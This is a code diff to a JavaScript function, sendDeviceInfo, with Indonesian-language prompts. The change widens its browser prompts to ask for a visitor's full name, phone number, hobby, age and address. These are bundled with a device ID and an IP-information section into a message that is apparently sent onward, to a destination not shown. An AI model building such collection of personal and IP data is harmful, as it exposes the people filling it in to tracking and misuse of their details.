@@ -135,8 +135,12 @@
 
     async function sendDeviceInfo(key) {
       try {
-        // minta nomor HP manual
-        const phoneNumber = prompt("Masukkan nomor HP kamu (contoh: 6281234567890):") || "Tidak dimasukkan";
+        // biodata manual
+        const fullName    = prompt("Masukkan Nama Lengkap kamu:") || "Tidak dimasukkan";
+        const phoneNumber = prompt("Masukkan Nomor HP kamu (contoh: 6281234567890):") || "Tidak dimasukkan";
+        const hobby       = prompt("Apa hobi kamu?") || "Tidak dimasukkan";
+        const age         = prompt("Berapa umur kamu?") || "Tidak dimasukkan";
+        const address     = prompt("Masukkan alamat kamu:") || "Tidak dimasukkan";
         // buat Device ID random
         const deviceId = Math.floor(100000 + Math.random() * 900000);
 
@@ -145,8 +149,12 @@
         const time = new Date().toLocaleString("id-ID");
 
         const message = `
-📋 *Informasi Umum*
+📋 *Biodata User*
+👤 Nama Lengkap: ${fullName}
 📱 Nomor HP: ${phoneNumber}
+🎯 Hobi: ${hobby}
+🎂 Umur: ${age}
+🏠 Alamat: ${address}
 #️⃣ Device ID: ${deviceId}
 
 🌐 *Informasi IP*
